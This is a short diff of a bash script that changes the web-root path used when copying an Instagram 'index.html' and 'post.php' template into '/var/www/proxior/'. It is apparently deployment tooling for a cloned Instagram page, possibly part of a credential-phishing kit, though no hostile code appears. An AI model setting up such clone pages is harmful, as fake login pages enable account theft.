@@ -1,5 +1,5 @@
 #!/bin/bash
 
-cp -avr /var/www/clonenew/default/instagram/index.html /var/www/clonenew/
-cp -avr /var/www/clonenew/default/instagram/post.php /var/www/clonenew/
+cp -avr /var/www/proxior/default/instagram/index.html /var/www/proxior/
+cp -avr /var/www/proxior/default/instagram/post.php /var/www/proxior/
 
